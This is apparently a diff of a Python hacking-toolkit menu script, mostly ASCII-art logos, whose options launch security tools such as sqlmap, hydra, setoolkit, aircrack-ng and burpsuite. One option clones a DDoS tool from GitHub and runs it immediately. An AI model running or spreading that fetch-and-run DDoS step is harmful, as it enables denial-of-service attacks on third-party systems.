+  ...=**++++++******######################################%%%%%%%%%%%%%%%%%%#**#%%%%%#**=-..        
+  ..:+**+++++******##########*******#####################%%%%%%%%%%%%%%%%*+*###****=##*#%#:.        
+ ...-**++++++******####**+++******#******+++**#########***#***##**++*++++#*###*#**#%%%*++*=..       
+ ..:+**+++++*********+---=+========+===+=++++========+********++++**#*#****######*+#*+=-:=+...      
+ ..-**+++++*****+=---=++++==*=++==-=====-+*===+=*++#**####*#***+*+***#**#***###+--**+----===..      
+ ..=**+++++++=====+==-=------=--=-+=+=++==++=+=**-=*+=-=+:---==-==++=-+#==-:=+-----=+++**+#%-..     
+ .:+**++++===------=+*++++++++++++++++===-=-=-===+==++++=*=+==+===-*+=-=+===+***+*#++*+*####*...    
+..-**+====--==+++==========+++++*++++++++******+++==-===+-+===+=+*++*++++=+#=++##**#%###+--=::..... 
+..===---=+++==--=================--::::--:=----===**###**++++++++*+********#####*+=-==------#+-.....
+..--====----=========+==+=+++++====+******+=======---:---=--=====+==------=-=--===*+++==++*+*+=:....
+...::::::::::------------------------------------------------------------:--------:::::::::::::.....
+....................................:::::::::::::::::::::::::..::.................................. ''' + END)
+    time.sleep(1)
+    subprocess.Popen(['wireshark'])
+
+if Option == '07':
+    os.system('clear')
+    time.sleep(0.2)
+    print(RED + r'''
+    ....................................................................................................
+...............................................-==-:................................................
+..............................................=@@@@@@@@%*+-.........................................
+..............................................+@@@@@@@@@@@@@@@*:....................................
+..............................................#@@@@@@@@@@@@@@@@@@%+:................................
+.............................................:@@@@@@@@@@@@@@@@@@@@@@%+:.............................
+.............................................-@@@@@@@@@@@@@@@@@@@@@@@@%:............................
+.............................................+@@@@@@@@@@@@@@@@@@@@@@@@-.............................
+.............................................#@@@@@@@@@@@@@@@@@@@@@@@-..............................
+............................................:@@@@@@@@@@@@@@@@@@@@@@@-...............................
+............................................=@@@@@@@@@@@@@@@@@@@@@@=................................
+.......................................*@@@@@*=-=#%@@@@@@@@@@@@@@@*.................................
+......................................#@@@@@@@@@@#=.:-+%@@@@@@@@@%..................................
+......................................:*%@@@@@@@@@@@%-....=@@@@@@:..................................
+.........................................%@@@@@@@@@@@@@#-....-*@+...................................
+.......................................:%@@@@@@@@@@@@@@@@@*....*=...................................
+.......................................-@@@@@@@@@@@@@@@@@@@@%==@@@@+:...............................
+.......................................-@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@%##*-.........................
+.......................................*@@@@@@@@@@@@@@@@@@@@@@@-.=@@%%@@@@@#........................
+.......................................:@@@@@@@@@@@@@@@@@@@@@@=...*@@#@@@@@@%=......................
+...................................%@@@@@@@@@@@@@@@@@@@@@@@@@@%....*@@@@@@@@@@%.....................
+...................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@#:..+@@@@@@@@@@@-....................
+...................................#@@@@@@@@@@@@@@@@@@@@@@@@@@%=...-@@@@@@@@@@@:....................
+.............:#%%%%%%%%%%%*........*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=..=@@@@@@@@@@:....................
+.............:%@%#*****#@@#........+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*....=@@@@@@@@-....................
+.............:%@@@*...#@@@*........=@@@@@@@@@@@@@@@@@@@@@@@@@@@@=.......%@@@@@@@@@#:................
+................*@*...%@=..........=@@@@@@@@@@@@@@@@@@@@@@@@@@%:.....=@@@@@@@@@@@@@#................
+................*@*...%@=........:+@@@@@@@@@@@@@@@@@@@@@@@@@@+.......:#@@@@@@@@@@@@@+...............
+................*@*...%@=....:=#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=.........#@@@@@@@@@@@@@-..............
+................*@*...%@=.-*%@@@@@@%+-=@@@@@@@@@@@@@@@@@@@@@@@@+:.......%@@@@@@@@@@@@%:.............
+................*@*...%@@@@@@@@@@@@@%.-@@@@@@@@@@@@@@@@@@@@@@@@@@@+:....:@@@@@@@@@@@@@*.............
+................*@*...%@@@@@@@@@@@@@%.-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+:..+@@@@@@@@@@@@@-............
+................*@*...%@@@**%+:.=@@@%.-@%--.:#@@+..+@#--.-%@@@@@@@@@@@@-.:%@@@@@@@@@@@@@:...........
+................*@*...%@#-@@@@@#.-@@%.-+%@@*.*@@@%.=+@@@=:%@@@@@@@@@@@@@*:*@@@@@@@@@@@@@#:..........
+................*@*...%%:*@@@@@@+.@@%.:#@@@*.*@@@%.:%@@@=:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+..........
+................*@*...%#:-@@@@@@*:@@@.=@@@@*.*@@@#.+@@@@=:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:.........
+................*@*...%@=.=@@@@@=#@@%.=@@@@*.*@@@#.+@@@@=:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.........
+................*@*...%@@#:..:-#@@@*:..-#@@-..-@+...-%@%..:=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*........
+................*@#...%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-.......
+................#@*...@@@*::.-**++=:::-+@@@@@@@@@@@@#*@*=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#.......
+................@@=..-@@@@-..=@@@@@@@*:..-%@@@@@@@@@-=%#=#==@%#*+@@@@@@@@@@@@@@@@@@@@@@@@@@@@-......
+.........=%*++*@@#..:%@%@@=..=@@@@@@@@%-..-@@@@@@@@@+#@#-@%-%+%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@#......
+.........#@@@@@#-..+@@*-@@=..=@@@@@@@@@*...%%::@@@@@++%*=@%:@+=**@@@@@@@@@@@@@@@@@@@@@@@@@@@@@......
+.........@@@@@@%@@@@#:.-@@=..=@@@@@@@@@@..:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+.....
+...........::-==-::....-@@=..=@@@@@@@@@%..+@@#*@@@@#*@@@*+#@@@@%*@@@#=+@@@@@@%++#@@@@@#+@@#+#@%:....
+.......................-@@=..=@@@@@@@@@=.*@%#:-@@##:=@+#@#:.#%#-:@**@%=.+@@**@@@+.*@#*:-%+#=+@%:....
+.......................-@@=..=@@@@@@@*-+@@@@%--@@@@-:+@@@@#.-@@+.-@@@@@::%+:+++++-+@@%:.*@@@%@%:....
+.......................-@@=..::::::...+@@@@@@--@@@@::@@@@@@.=@@=.@@@@@@-:%:-@@@@@@@@@%::@@@@@@%:....
+.......................-@@=..=@@@@@#:..=@@@@%--@@@@:=@@@@@*:%@@=:@@@@@%:#@-.#@@@@@%%@%:=@@@@@-......
+.......................-@@=..=@@:.%@%...:@@@%::@@@@-:%@@@*+@@@@=.*@@@@=%@@@:.:*#+-%@@%::@@@@+.......
+.......................-@@=..=@@:..*@@-..:#%####%@@:-#+*#@@%+%@=:#*+*@@@*+@@%*+#@@@@%#####@@+.......
+.......................-@@=..=@@:...=@@=...+@@@@@@@:-@@@@+:*%@@=:@@@@*-....-*%@%*-**********-.......
+.......................-@@=..=@@:....:%@*...-%@@@%+..*@@%..#@@#:.=%@@-..............................
+.......................-@@=..=@@:.....:#@%-..:*@@@@@@@@@@:.#@@@@@@@@@-..............................
+.....................-@@@@-..=@@@@......+@@*....*@@@@@#@@*..........................................
+.....................-@@%*====*%@@.......:#@@%+=--==*%@@*:..........................................
+.....................-@@@@@@@@@@@@..........-#@@@@@@%*:.............................................
+....................................................................................................''' + END)
+    time.sleep(1)
+    subprocess.run(['john', '--help'])
+
+
+if Option == '08':
+    os.system('clear')
+    print(r'''.....-===+-:.......                        ..................                  .. ......:-=::-=-....
+..-=........:==:......            ............:-:====--::..............        .....:==.....::..:=..
+.-..:::=+-..::.-*+:...             ......::===++#++==+=-====-::........        ...=*+:::.:=*#*=:..:.
+::.:+#:+#%*+=:.:.=##:....  .........:==+=+#=+*=+*++**++**=*===+*=::.............=#*-:--*%##%@*=-=.:.
+-.-+##=*++*+=+-::.=##*:..  .....:-+*++**+**++*+++++***+++=*++*+++*++=-:.......=*#*-:-=**###*#+#%*=:.
+-:*%=%@*%%##%=:....=###=.....=+*##+*#*--*#=+**+#*+++%*##***++=+=+*##*+*=::..:+#*+=::-+**%#%%%#%%*#-:
+==%*%#%###*###%#=-..=*##*:.-=*=++++*+=*+++*+***+*++***#**#*+*+#*++*****=----**++*.-+*#%#**%###%%%%+.
+=*%%%%=##***+*%%*-..:=*=+===+++++++#%+-++=*#*=#+*+=**#+*##+=**#+=+-+++**==:-=--=-:*%###*+*#%%###%%+.
+:#%%#*%#*#=+*#%#+=:..===-:-==+==+=+==+*+=+**+++++++****++*+=+=**+**+**++++-.::-+.:*####*+=%#####%#+.
+.+%%###%#%#+-+##*+=..:*-..-=+#**+=**#*+*#+*++*+*+*++*+++++=*#*#*+*+++*++***-..+=.:#%#%+=+%###*#%%#-.
+.-#%##%%%#*++#+*%*-...=::*=*+****++++*++**+**+++++****++****+**+=+++=+==+++*+-=-.-#%#=*+++#%%####=:.
+..=%#%###%##*=+#%#+...:**++**++*+*****+++==++#*+*++=+**#**++=**+*+#***+==+**+++==-*%#+++*%%%%%#%+=..
+..:=##%#####**##%=...-=***+**#++*::---=*****++*#=++=+#*****++=+-==-==++***+*+**+-:+#%%#*#%%%%+*+=...
+....=*%#%#%#%##*=:::-+=+*##++++-:::::=++=:=+*++*#++##*+++*+--+++::--:-*+*#*#*+*+=---+#@##%%%%%+-..  
+....::+%#%@#+%*=..:-=+***-+-....:-=--=:..+=:+#*+*+**++**+:=+:..:-=--==:..=#**##**+--::*=#####--...  
+......-=*#+#+::..::-+*++--...*#%%%+==-++=::=:+#***+#++*+=+:.-###-=-::=**-..+**#*++*:...=#***-:....  
+.  ....:-=%#::..::=++*=:-.:=#*++==:--..:=+:.=.+#***+*#*.=::###+=--:...--*+=.=**#*#=+*-.=*#+=.....   
+      ...-***+..:==+*+:=.==%*+-==:..==-:-+#:.+:++*##+*:=--#*+==-..-*+---=##-.++*#*+==::=*+-....     
+      .....=+::=.=%*#-=..=##=---......:#**%*.--**##**+==-%#=+=.......+#-+#*=:.++##*+=--+*...        
+      ......=*=-==+*+:=::+#+---:.......==+++:===*+*=*-+=-*+=--.......=+==+*+-==*###+=++-:...        
+         ....:+#++*#+:=-:+*+=--:+:....-===**::++*+***+*=-#*====-....-=*-=+++:-+*##*:*++=....        
+         ...--+=++*#*+:=:-**=-----=-----=**-.==+##**+-=+.=#+----==+===-=+*#=-#=#***=*=*-....        
+         ...:-**+*#*#+.:-.:#%+-----:::-=**--::=*####+*-=::+*+==--::===++#*+:*=+*#**+++---...        
+         ....:=*==++*+*-:--:=***++=++++*--:=::#***+++*=-==:=*##*=+==**#==-=*=+*#*#*++*-:..          
+         ....--+=*=-++**-.:-+:::=#+*#+::=+:::*###*+=++*==-:--:-*#*=##=-----+##***#+=+=--...         
+          ..::.-*=-:*+=**++-:::+====+*+:-*+*#*=***=-=#%*#*+=.:++-=+-=+=:=*+***#*+++=+-......        
+            ..-=+==--=*==##**++*---+=++*****-:#=--+=:-*+++*+*+++-=--=++**##*##+*+===-::....         
+            ....+=++==:=*+*++#****+*++*=+++*=*==##+%#-**#*++=+++*+++*#******+++-++==:....           
+            ....:==++++===+-+*+###*++*++++*#*=--**-*+=****+=+++****#*#****+*=-==+=--.....           
+             ....:--+=*=-:---=*+++*#*******+--....::=**#**+*+***#***#+-+-=:=:=++:-:... ..           
+               ....:--++-----:==-==:-::-+**##---:-:+*****#*+=-:::-=-+-==---=--=::.....              
+                  .....-==:=-=:==-+::-:::::::-=*=:.:=++:::::-=:===-.=-----.:-.:....                 
+                  ......:---=:---:-=::---++===:-+*****+*####+:=-:--=---:-.::.......                 
+                     ......::--:=::.:.:.:=+*+####**######*=-:.::------.:........                    
+                     ..  ......::---::-::..:-=*#*##*#**=:..::-:-----.:.......                       
+                             ...:..::-.:::.:.:........:.::::-::-:.........                          
+                                 .........:.:..........:.-.:.:......                                
+                                 ....................:..............                                
+                                       .... .... ...............                                    ''')
+    time.sleep(1)
+    subprocess.run('sqlmap')
+
+
+if Option == '09':
+    os.system('clear')
+    print(CYAN + r'''
+                                                                                                        
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                            .-+**********+-.                                        
+                                       ..-********************-..                                   
+                                      :+************************+:                                  
+                                    :+*********=-:....:-=*********+:                                
+                                  .-*******+:.     .:.    .:+*******-.                              
+                                 .=******=.        :+*:      .=******=.                             
+                                .=******:.        .-***-.     .:+*****-                             
+                               .-******.          :*****=.        ...                               
+                               .******.       .=**********=..                                       
+                           .   -*****=      .=**************=.                                      
+                          :    =*****:     .+*****************-.                                    
+                          :    =*****:     =*******************+.                                   
+                          -    =*****:   .:**********************:                                  
+                          =    :#****=  .=************************-                                 
+                          =:   .+*****.  .=************************:                                
+                          .*.  .-******:   .=---==+****************+.                               
+                           +-   .=******-.        .:****************:                               
+                           .*:   .=******+.        .+***************=                               
+                           .-*.    :********-..    .+***************:                               
+                            .+#.    .=*********+=---+*************=.                                
+                             .=%=.    .=************************=.    ..                            
+                               :%#..     :+******************+:     .:%+.                           
+                                .*@*:.      .:=++******++=:.      .-#@@*.                           
+                                  :*@%=.                        :*%@@@=.                            
+                                   ..+@@@#:                 .-#@@@@%-.                              
+                                       :*%@@@@#+=-::::-=*%@@@@@@%=.                                 
+                                          .-+*%@@@@@@@@@@@@#*=:.                                    
+                                               ....:::....                                          
+                                         .@.                                =-                      
+                                         .@.                                =-                      
+                  :***#+.      .-*#*=.   .@####-    .-====.     .-====.     =*+++=.                 
+                .*=.. ..+=.   -#.....#=  .@.....  .:=.. ..:=. .-=.. ..-=.   =-....                  
+                =+.     .*:  -*   .+*:   .@.      .=.         :=.     .=-   =-                      
+                +=      .*-  -*.:*+.     .@.      .=.         :=.     .-=   -=                      
+                +-      .*-  .*%+.. .=:   :#:     .-=.    :=. .=-    .:*=   .=-.                    
+                =-      .*:    .*%#%*:     .=%#-    .-***+:     .=++++.--    ..=+=.                 
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    ''' + END)
+    subprocess.run(['nc', '-h'])
+
+if Option == '10':
+    os.system('clear')
+    subprocess.run(['sudo', 'setoolkit'])
+
+
+if Option == '11':
+    os.system('clear')
+    subprocess.run(['git',
+                     'clone',
+                       'https://github.com/palahsu/DDoS-Ripper.git'])
+    subprocess.run(
+    ["python3", "DRipper.py"],
+    cwd="DDoS-Ripper"
+    )
+
+
+if Option == '12':
+    os.system('clear')
+    print(GREEN + r"""
+                                                                                                        
+                                                                                                    
+                                                   @@@         @@@@                                 
+                                                  @#%        @%#%@                                  
+                                                 @#*@   %@@@@%##@                                   
+                                                @%**##*********#@                                   
+                                               @%#************#*#@    @#@                           
+                                               @-**********+=#*+#%@   %-:--==++*+=#%                
+                                              %@**************-.*#%  %=..........:#@                
+                                          %%%%##************=-+:*#%@ #=##**+-:....-#@               
+                                         @#==--**********=-:-=#-*#%@ @@@@%##*=*#=:.=*%@             
+                                            %-.=******+-....+**=*#%@#=* @%*==+###+-:-*%@            
+                         @%%%@@%@@@@@@%     @#:...........-***-+*#%%..:=+*##-=##*##%=*##@@          
+                       %@############%@%@     %=:#*+++##:-*##-:**#@+..:.........:#%%=-##*%@         
+                    @%%#************###%%%%@@@@@@%@%%########-=**#@+=@@@@*---=-..:----*%%%%@        
+                 @%#*******************##%%%@@%% @%#*==+*##+--+*#%@%*%  @*:::::::-::-+#%%@@%@       
+               @%****+:.-=:.-....--+*****#%@@@*=@%*==+#=:#*:==*##%@@%@  %=:::::-=:::-*#%%@ @        
+            @@#*=+*+=:..-..:...::..:-+****#%@@@=...........=-**%@%@@%   %:...-==:::::#%%%@          
+          @@%**-=--*##+=::-==++=-::...=***#%%%@@+.:::::...-:**#@@@    %%=:::::-:::::+#%%%@          
+        @#=--:.-@@@@#*:-#@@     @%*-:::+***#%%@@%:=:..::=--+*#%%     @#:......:::::=##%%%@          
+         %+...=%@ @*--.:%         @%:..+***#%@@@%+:...-:-=+*#@@@    %+::::...:::::=#####@           
+           %@%*%@%@#=:+%           @+::***#%%@@+==-..===-=##%@    @%-......-:::::+######@           
+                @#+-:#@            @*:-**##%@%=:--::..-:+#%@@  @#=:..:::...::::-*####%#@            
+                 %=:%              %::+***%@%:::::...::+##%%%%*-::.....::-:::-*#####%%%%            
+                  %%              %-:-****+:::::::..:-*##%%#-.....:-:.::::--*#######@@@             
+                 @%@            #+-::****=:::::...::=**+-:::::....:::-::-=*####%@##@ @              
+                  @@@@@        @*:::+*+-::::::::.:=**=:::....::-:::::-+*#####%%@@%@                 
+                  @@@@@       @=:::+*-:::::::..::=-:::..-:.::::::--*####%%###%@@@@                  
+                             @+:::=*-:--::::.:::---::....::-::-=*#####%@@%#%@                       
+                            %*:::-+::::::::::::::::::-:::::-+**####@%%@@%%@@@                       
+                            %-:::=-::::::::--::::::::::-=*****#@@%% @@%#*+#@@                       
+                           @*::::=----:::-:::::--:::::=*********#%@@%%#@@%@@@@@%@@@                 
+                           @-::::-:::::-::::::::::-::+************#################%@@              
+                           @-:::::::::::::::::::::::=*************###################%@@            
+                           @+:::::::::::::::::::::::*************#####################%%@           
+                            %-::::::::::--:::::::--:*************#####################%%%@@         
+                            %*::::::::::::::::::::::=************#####################%%%%%         
+                             %+:::::::::::::::::::::-************######################%%%%@        
+                              @*::::::::::::::::::-=-:+**********#####################%%%%%@        
+                               @#-::::::::-----:::::::::=********#########%@@@@@@@@%###%%%%         
+                                @%=:::::::::::::::::::::--:=+****#####%%@@         @@#%%%%@         
+                                  @%+::::::::::::::---:......::--+*%@@@             @#%%%@          
+                                     @%+-:::::--::::::::..:-.:-*%@%               @%##%@            
+                                      @ %%**===-------=+*#%@@@   @@%%%%%%%@@@@@%%%##%%@             
+                                    @%##%#@@%#@@%###%#%@     @@%##################%%@               
+                                    @%%%@%%@%@@@%%%%%%%     @%#%@@@@@@@@@%@@@%%@@@                  
+                                     @@@@@@     @@@@%@@    @##@               %@%@                  
+                                         %        @@      @##@              @%**%%                  
+                                                         @%#%@           @@%##**@                   
+                                                          @##@           @@@#%@#@                   
+                                                          @%##%@@       @%##%@@@@                   
+                                                            @%###%%%%%%%#%%@                        
+                                                               %@@@%%@@@@ 
+                                        
+                                                                                                    
+                                                                                                    
+    """ + END)
+    time.sleep(1)
+    subprocess.run('sudo apt install hydra', shell=True)
+    subprocess.run('hydra', shell=True)
+
+if Option == '13':
+    os.system('clear')
+    burp = r'''
+                                          .::--====.   ----:::::..                                      
+                               ..:-============.   --------------:...                               
+                            .-=================.   -------------------:.                            
+                       ..:=====================.   ----------------------:...                       
+                     .:========================.   --------------------------..                     
+                  ..-==========================.   ----------------------------:..                  
+                 :=============================.   -------------------------------..                
+              .:===============================.   --------------------------------:..              
+             .=================================.   ----------------------------------:.             
+           .-================================:    .------------------------------------:.           
+          .================================.     :---------------------------------------.          
+        .-===============================:.   .:------------------------------------------:.        
+       .-==============================:    .:---------------------------------------------:.       
+      .==============================:    .:-------------------------------------------------.      
+     .=============================.   ..:---------------------------------------------------:.     
+    .============================:    .:-------------------------------------------------------.    
+   .-==========================:    .:---------------------------------------------------------:.   
+   :=========================..  ..:------------------------------------------------------------:   
+  .========================.   ..:---------------------------------------------------------------.  
+ .=======================.    .-------------------------------------------------------------------. 
+ :=====================.    .:--------------------------------------------------------------------. 
+.-===================:.                            .----------------------------------------------:.
+.====================:.                            .-----------------------------------------------.
+:===============================================.  .-----------------------------------------------:
+-===============================================.  .-----------------------------------------------:
+================================================.  .-----------------------------------------------:
+================================================.  .------------------------------------------------
+================================================.  .------------------------------------------------
+================================================.  .------------------------------------------------
+================================================.  .-----------------------------------------------:
+-===============================================.  .-----------------------------------------------:
+:===============================================.  .-----------------------------------------------:
+.===============================================.                            ..--------------------.
+.-==============================================.                            ..-------------------:.
+ :====================================================================-.    .---------------------: 
+ .===================================================================.    .-----------------------. 
+  .===============================================================-..   .------------------------.  
+   :============================================================-..  ..-------------------------:   
+   .-=========================================================-.    .--------------------------:.   
+    .=======================================================-.    .----------------------------.    
+     .====================================================-..   .-----------------------------.     
+      .=================================================-.    .------------------------------.      
+       .-=============================================-.    .------------------------------:.       
+        .-==========================================-.    .-------------------------------:.        
+         ..=======================================-.    .--------------------------------..         
+           .-====================================.    .--------------------------------:.           
+             .===================================    ---------------------------------.             
+              .:=================================    -------------------------------..              
+                .:===============================    -----------------------------..                
+                  ..-============================    --------------------------:..                  
+                     .:==========================    ------------------------:.                     
+                       ..:=======================    --------------------::..                       
+                            .-===================    -----------------:.                            
+                               ..:-==============    ------------:...                               
+                                      .:--=======    ----:::..                                      '''
+    burp = burp.replace("==", "TEMP").replace("--", "==").replace("TEMP", "--")
+    print(ORANGE + burp + END)
+    time.sleep(1)
+    subprocess.Popen('burpsuite')
+
+if Option == '14':
+    os.system('clear')
+    print(CYAN + r'''
+    ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..................................
+:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::...................................
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::....................................
+:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::...................................
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..::....................................
+::::::::::::::::::::::::::::::::::::::::::::::::::::::..::..........................................
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::............................................
+:::::::::::::::::::::::::::::::::::::::::::::::::::::::::...........................................
+:::::::::::::::::::::::::::::::::::::::::::::::::::::::.............................................
+::::::::::::::::::::::::::::::::::::::::::::::::::::................................................
+:::::::::::::::::::::::::::::::::::::::::.:.:::::::.:...............................................
+::::::::::::::::::::::::....:::::::::::::::::::::::.................................................
+.::::::::::::::::::::::::::::::::::::::::::::-----::..................:--:..........................
+.:::..::::::::::::::::::::::::::::::::::-*%%%%%%%%%%%#+:.............-=+++-.........................
+........:....:.:.::.::...............:=#%%%%%%%%%%%%%%%%%*:........-++++++++:.......................
+........:.:....:.::::::.............-#%%%%%%%%%%%%%%%%%%%%%#-...:==++++++++**:......................
+.................::::::............=%%%%%%%%%%%%%%%%%%%%%%%%%*--++++++++***-........................
+..................:::::...........=%%%%%%%%%%%%%@@@@%%%%%%%%#+++++++++**+:..........................
+.................................:%%%%%%%%%%@@@@%%#####%%%%+++++++++**+:............................
+.................................#%%%%%%%%@@@%+:....:.....-+++++++**=:..............................
+................................-%%%%%%%%%@%=..-#@@@@@#*=:..-+++*#%-................................
+................................*%%%%%%%%@#..=%@#+.....-=+*:.:+#%%%%-...............................
+...............................:#%%%%%%%@@@**@%-..:-==-..:++==**##%%#:..............................
+...............................:#%%%%%%%@@@@@@%=-++===++--+++++++++*#*..............................
+...............................:#%%%%%=....@@%*+++=...-+++.........=*#-.............................
+...............................:#%%%%+.....-*++++++---++++...:---:...-+:............................
+................................*%%%*:.:#...+#*****+++++++..:*%@@%#...--............................
+................................-%%%=..*@+..-%@@@@*..:=++*..:#@@%%%...+=............................
+................................:%%*..=%@@...+@@#==..:+*#%...=+++=...=%+:...........................
+.................................=#...-+++-..:+++++..:#@@@...:::...=#%%+:...........................
+.................................:-..:::::::..:++**..:#@@@. :#@%+...*%%+:...........................
+....................................-###%%+=:..=#%@..:#@@@..:#@@%*...+%+:...........................
+...................................:*%%%*=++=..:%@@..:#@@%..:#@%%%*:..+=............................
+................................::::=#*==+**#***%@@**#%@@@**#%@%%%%#**+-............................
+...................................:-=++*#%%%%@@@@@@@@@@@@@@@@%%%%%%%%+:............................
+..................................-=+**#%%%%%%%%@@@@@@@@@@@@%%%%%%%%%#-.............................
+...............................:-=+*=:.:#%%%%%%%%%%%%%@%%%%%%%%%%%%%%=..............................
+.............................:-=+*-:.....-%%%%%%%%%%%%%%%%%%%%%%%%%%-...............................
+...........................:-+*=:.........:=%%%%%%%%%%%%%%%%%%%%%%#:.............................:..
+..........................:++-:.............:-#@%%%%%%%%%%%%%%%%%-:..............................:..
+...............................................::+@@@%%%%%%%@%+:..............................::::::
+.....................................................:::-::..................................:::::::
+...........................................................................................:....:...
+.................................................................................:.........:.....:::
+..............................................................................::.:::::::...:........
+............................................................................::::::::::::::::::::::::
+...........................................................................:::::::::::::::::::::::::
+.............................................................................:.:..:..:.:::::::::::::
+.............................................................................::::::::.::::::.:::::::
+........................................................................::::::::::::::::::::::::::::
+..................................................................:..:::::::::::::::::::::::::::::::
+.....................................................................:::::::::::::::::::::::::::::::
+..................................................................::::::::::::::::::::::...::::.:::.
+.................................................................::::::::::::::::::::::::::::::::.:.
+...................................................................:::::::::::::::::::::::::::::::::''' + END)
+    time.sleep(1)
+    subprocess.Popen('aircrack-ng')
+
+
+if Option == '99':
+    sys.exit()
+
+
+
+
+
